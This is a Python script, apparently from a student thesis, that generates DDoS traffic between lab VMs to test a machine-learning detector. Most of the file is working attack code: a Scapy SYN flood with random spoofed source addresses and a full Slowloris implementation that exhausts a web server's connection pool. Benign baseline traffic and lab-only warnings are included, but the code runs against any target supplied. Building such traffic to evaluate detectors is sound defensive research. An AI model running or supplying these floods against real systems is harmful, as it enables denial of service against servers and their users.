#!/usr/bin/env python3
"""
ddos_traffic_generator.py - Traffic generator for 2-VM DDoS detection demo.

Generates attack traffic for 2 demo scenarios plus benign baseline, designed
to run on the ATTACKER VM targeting the VICTIM VM where live_ips.py is running.

  - Kịch bản A: SYN Flood + IP Spoofing (Layer 4) — tràn state table
  - Kịch bản B: Slowloris (Layer 7) — vắt kiệt connection pool web server

This script is intended for CONTROLLED LAB ENVIRONMENTS ONLY.
Only use it between VMs on an isolated virtual network.

Usage:
    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_spoof -d 60
    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack slowloris -d 120
    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -d 90
    sudo python3 tools/ddos_traffic_generator.py --list

Attack types (Kịch bản):
    benign    - Lưu lượng bình thường (HTTP, ICMP, DNS)
    syn_spoof - SYN Flood + IP Spoofing (Layer 4, như hping3 --rand-source)
    slowloris - Slowloris (Layer 7) — giữ kết nối HTTP mở lâu
    all       - Chạy tuần tự: benign → syn_spoof → slowloris

Requirements:
    pip install scapy
    Must run as root/sudo (raw socket access)
"""

from __future__ import annotations

import argparse
import logging
import os
import random
import socket
import sys
import time

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("ddos_traffic_generator")

try:
    from scapy.all import (
        IP,
        TCP,
        UDP,
        ICMP,
        Raw,
        RandShort,
        send,
    )
except ImportError:
    logger.error("Scapy not installed. Install: pip install scapy")
    sys.exit(1)


ATTACK_DESCRIPTIONS = {
    "benign": "Lưu lượng bình thường (HTTP GET, ICMP ping, DNS query)",
    "syn_spoof": "SYN Flood + IP Spoofing (Layer 4) — IP nguồn giả mạo, tràn state table",
    "slowloris": "Slowloris (Layer 7) — giữ kết nối HTTP mở, vắt kiệt connection pool",
}


def _check_root() -> None:
    if os.geteuid() != 0:
        logger.error("This script requires root privileges. Run with sudo.")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Benign baseline
# ---------------------------------------------------------------------------

def generate_benign(target: str, duration: float, pps: int) -> None:
    """Generate normal HTTP, ICMP, and DNS traffic."""
    logger.info(f"Generating benign traffic to {target} for {duration}s")
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)

    while time.time() < end_time:
        # HTTP GET (TCP port 80)
        pkt = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=80,
            flags="S",
        )
        send(pkt, verbose=False)
        count += 1

        # ICMP ping
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=False)
        count += 1

        # DNS query (UDP port 53, small payload)
        pkt = IP(dst=target) / UDP(
            sport=RandShort(),
            dport=53,
        ) / Raw(load=b"\x00" * 32)
        send(pkt, verbose=False)
        count += 1

        time.sleep(delay)

    logger.info(f"Benign traffic done: {count} packets sent")


# ---------------------------------------------------------------------------
# Kịch bản A — SYN Flood + IP Spoofing (Layer 4)
# ---------------------------------------------------------------------------

def _random_ip() -> str:
    """Generate a random non-reserved IP address for spoofing."""
    while True:
        octets = [random.randint(1, 254) for _ in range(4)]
        if octets[0] in (10, 127) or (octets[0] == 172 and 16 <= octets[1] <= 31):
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        return ".".join(str(o) for o in octets)


def generate_syn_spoof(target: str, duration: float, pps: int) -> None:
    """TCP SYN Flood with IP Spoofing — random source IPs each packet.

    Equivalent to: hping3 -S --flood -V -p 80 --rand-source <target>
    Each packet has a different spoofed source IP, causing the victim's
    state table to fill with half-open connections to non-existent hosts.
    """
    logger.info(
        f"SYN Flood + IP Spoofing to {target}:80 for {duration}s at ~{pps} pps"
    )
    end_time = time.time() + duration
    count = 0
    delay = 1.0 / max(pps, 1)

    while time.time() < end_time:
        pkt = IP(src=_random_ip(), dst=target) / TCP(
            sport=RandShort(),
            dport=80,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
        )
        send(pkt, verbose=False)
        count += 1
        time.sleep(delay)

    logger.info(f"SYN Flood + IP Spoofing done: {count} packets sent")


# ---------------------------------------------------------------------------
# Kịch bản B — Slowloris (Layer 7)
# ---------------------------------------------------------------------------

def generate_slowloris(target: str, duration: float, pps: int) -> None:
    """Slowloris (Layer 7) — hold HTTP connections open.

    Opens many TCP connections to the target web server and sends
    partial HTTP headers periodically to keep them alive, exhausting
    the server's connection pool.

    Note: The ML model was trained on CICDDoS2019 which does NOT
    contain a Slowloris class. The model may classify this traffic
    as TCP SYN Flood or Benign — this is a known limitation worth
    discussing in the thesis report.
    """
    num_sockets = min(pps, 500)
    logger.info(
        f"Slowloris to {target}:80 for {duration}s with {num_sockets} connections"
    )
    logger.info(
        "Note: Model has no Slowloris class — may classify as TCP SYN or Benign"
    )

    sockets: list[socket.socket] = []

    def _create_socket() -> socket.socket | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, 80))
            s.send(b"GET /?" + os.urandom(4).hex().encode() + b" HTTP/1.1\r\n")
            s.send(f"Host: {target}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
            return s
        except Exception:
            return None

    # Open initial connections
    for _ in range(num_sockets):
        s = _create_socket()
        if s:
            sockets.append(s)

    logger.info(f"Opened {len(sockets)} initial connections")

    end_time = time.time() + duration
    keep_alive_count = 0

    while time.time() < end_time:
        # Send keep-alive headers on existing connections
        alive = []
        for s in sockets:
            try:
                header = f"X-a: {random.randint(1, 5000)}\r\n"
                s.send(header.encode())
                alive.append(s)
                keep_alive_count += 1
            except Exception:
                pass
        sockets = alive

        # Replenish dropped connections
        diff = num_sockets - len(sockets)
        for _ in range(diff):
            s = _create_socket()
            if s:
                sockets.append(s)

        time.sleep(10)  # Send keep-alive every 10s

    # Cleanup
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    logger.info(
        f"Slowloris done: {keep_alive_count} keep-alive headers sent, "
        f"peak {num_sockets} connections"
    )


# ---------------------------------------------------------------------------
# Attack registry & runner
# ---------------------------------------------------------------------------

ATTACK_GENERATORS = {
    "benign": generate_benign,
    "syn_spoof": generate_syn_spoof,
    "slowloris": generate_slowloris,
}


def run_all_attacks(target: str, duration: float, pps: int) -> None:
    """Run benign → syn_spoof → slowloris sequentially."""
    attacks = ["benign", "syn_spoof", "slowloris"]

    per_attack_duration = duration / len(attacks)
    logger.info(
        f"Running {len(attacks)} phases, "
        f"{per_attack_duration:.0f}s each, total {duration:.0f}s"
    )

    for i, attack in enumerate(attacks):
        logger.info(f"\n{'='*60}")
        logger.info(f"Phase {i+1}/{len(attacks)}: {attack}")
        logger.info(f"{'='*60}")
        ATTACK_GENERATORS[attack](target, per_attack_duration, pps)
        if i < len(attacks) - 1:
            logger.info("Pausing 2s between phases...")
            time.sleep(2)

    logger.info("All attack phases completed.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DDoS traffic generator for 2-VM detection demo (LAB USE ONLY)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "WARNING: This tool is for controlled lab environments only.\n"
            "Only use between VMs on an isolated virtual network.\n"
            "Unauthorized use against real networks is illegal.\n\n"
            "Examples:\n"
            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack syn_spoof -d 60\n"
            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack slowloris -d 120\n"
            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack all -d 90\n"
            "  sudo python3 tools/ddos_traffic_generator.py --list\n"
        ),
    )
    parser.add_argument("--target", "-t", type=str,
                        help="Victim VM IP address")
    parser.add_argument("--attack", "-a", type=str,
                        choices=list(ATTACK_GENERATORS.keys()) + ["all"],
                        help="Attack type to generate")
    parser.add_argument("--duration", "-d", type=float, default=30,
                        help="Duration in seconds (default: 30)")
    parser.add_argument("--pps", type=int, default=100,
                        help="Approximate packets per second (default: 100)")
    parser.add_argument("--list", action="store_true",
                        help="List available attack types and exit")

    args = parser.parse_args()

    if args.list:
        print("\nAvailable attack types:\n")
        for name, desc in ATTACK_DESCRIPTIONS.items():
            print(f"  {name:16s} {desc}")
        print(f"\n  {'all':16s} Chạy tuần tự: benign → syn_spoof → slowloris\n")
        return

    if not args.target:
        parser.error("--target is required (victim VM IP)")
    if not args.attack:
        parser.error("--attack is required (attack type)")

    _check_root()

    logger.warning("=" * 60)
    logger.warning("  DDoS TRAFFIC GENERATOR — LAB USE ONLY")
    logger.warning(f"  Target: {args.target}")
    logger.warning(f"  Attack: {args.attack}")
    logger.warning(f"  Duration: {args.duration}s, PPS: {args.pps}")
    logger.warning("=" * 60)

    if args.attack == "all":
        run_all_attacks(args.target, args.duration, args.pps)
    else:
        ATTACK_GENERATORS[args.attack](args.target, args.duration, args.pps)


if __name__ == "__main__":
    main()
